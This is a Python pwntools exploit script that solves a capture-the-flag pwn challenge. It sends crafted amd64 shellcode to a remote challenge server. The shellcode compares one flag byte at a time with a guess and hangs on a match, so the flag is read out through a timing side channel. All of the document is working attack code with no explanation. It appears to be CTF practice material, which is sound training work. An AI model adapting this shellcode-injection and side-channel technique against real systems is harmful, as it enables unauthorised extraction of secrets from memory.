from pwn import *

context.arch="amd64"
context.os='linux'
context.endian="little"
context.log_level="error"

shellcode = """
add al, 2
sal rax, 32
mov bl, byte ptr [rax+{}]
cmp bl, {}
jz $-0x3 
"""

possible_char="0123456789abcdef-}"
pi = [ord(x) for x in possible_char]

flag = 'flag{'
idx = 5
n = 32
ip = 'node4.buuoj.cn'
port = 28277
print("ip: {}, port: {}".format(ip, port))
while 1:
    bb = True
    for x in pi:
        # p = process("./xman_2019_nooocall")
        p = remote(ip, port)
        p.sendafter("Your Shellcode >>", asm(shellcode.format(idx, x)))
        bb = p.can_recv(timeout=3)
        p.close()
        if not bb:
            flag += chr(x)
            print(f"current flag: {flag}")
            break

    if flag.endswith("}"):
        break
    if bb:
        print("something wrong...")
        continue

    idx += 1

